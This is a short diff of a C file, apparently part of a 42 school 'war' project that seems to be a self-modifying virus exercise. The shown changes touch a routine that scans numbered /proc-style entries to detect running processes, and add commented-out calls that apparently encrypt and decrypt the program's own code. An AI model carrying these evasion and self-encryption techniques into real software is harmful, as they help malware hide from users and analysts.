@@ -6,23 +6,11 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/27 12:20:54 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/31 21:06:39 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/01 18:06:52 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "war.h"
-
-__INLINE__ bool	check_name(char *str, int len)
-{
-	if (!str)
-		return (false);
-	for (register int i = 0 ; i < len ; i++)
-	{
-		if (str[i] < '0' || str[i] > '9')
-			return (false);
-	}
-	return (true);
-}
 
 void	opening(t_data *data)
 {
@@ -53,6 +41,7 @@ void	opening(t_data *data)
 			int len = _strlen(curr->d_name);
 			if (check_name(curr->d_name, len) == true)
 			{
+
 				_memcpy(path + 6, curr->d_name, len);
 				path[6 + len] = '\0';
 				if ((fd[1] = _open(path, O_RDONLY, 0000)) < 0)
@@ -60,7 +49,6 @@ void	opening(t_data *data)
 					_close(fd[0]);
 					goto ERR;
 				}
-
 				_memcpy(path + (6 + len), target, 9);
 				if ((fd[2] = _open(path, O_RDONLY, 0000)) < 0)
 				{
@@ -79,11 +67,11 @@ void	opening(t_data *data)
 						{
 							_close(fd[2]);
 							_close(fd[1]);
-							data->context = false;
 							goto ERR;
 						}
 					}
 				}
+
 				_close(fd[2]);
 				_close(fd[1]);
 			}
@@ -93,5 +81,7 @@ void	opening(t_data *data)
 	data->context = true;
 
 ERR:
+	/* update_two(&data->key, (char*)opening, (size_t)war - (size_t)opening); */
+	/* revert_two(&data->key, (char*)war, (size_t)locate - (size_t)war); */
 	war(data);
 }
